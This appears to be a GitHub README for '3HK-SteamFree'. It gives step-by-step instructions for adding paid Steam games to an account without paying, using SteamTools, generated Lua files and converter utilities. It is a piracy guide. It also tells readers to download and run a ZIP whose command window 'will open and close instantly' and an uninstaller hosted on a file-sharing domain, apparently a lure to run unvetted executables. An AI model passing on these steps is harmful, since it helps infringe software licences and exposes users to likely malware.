# 3HK-SteamFree | Auto Add Free Games to Your Account
&nbsp;&nbsp;&nbsp;&nbsp; Welcome to the Free Games Store ‚Äî your ultimate destination to download your favorite games without spending a Dh!
 ## ‚òëÔ∏è Install
&nbsp;&nbsp;&nbsp;&nbsp; We rely on **three primary** sources to get free games directly added to your steam account.
1. First, download the tool called SteamTools from their official website
(or you can download it directly from the "Releases" section at the top of this GitHub page).
 ### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  [SteamTools](https://www.steamtools.net/)
2. The next steps will guide you through how to connect your account, claim free games, and automate the entire process using the tool.<br>

 ## üìã Guide
1. Go to Steam and copy the name of the game you want.
2. .Open [SteamDB](https://steamdb.info/) and paste the game name into the search bar.
3. Copy the game's **App ID**.
4. Head to [Lua Generator](https://cysaw.org/) and paste the **App ID** to generate the game‚Äôs Lua file.
5. After downloading and opening **the generated Lua file**, drag all files except *__readme.txt__* into the main program **SteamTools**.
6. Restart **Steam** from within **SteamTools**, as shown in the tutorial video.

## üß© File Format: .st
```
‚ö†Ô∏è Note: Some games may be in .st format instead of .lua,
  which might prevent them from appearing in your Steam library right away.
```
To fix this:
1. Drag the **.st** files as-is into the program.
2. Download and run [ST2Lua.zip](https://github.com/user-attachments/files/21120158/ST2Lua.zip) ‚Äî the cmd will open and close instantly.
3. Open your **Steam account**, and you should now see the game in your _library_.
4. That‚Äôs it ‚Äî enjoy your games!

##  üéØ uninstall
&nbsp;&nbsp;&nbsp;&nbsp; To remove a game you previously added, simply download [CreamInstaller](https://d.kuku.lu/wevgvmjf8).<br>
After launching it, select the game from the list and remove it with one click.
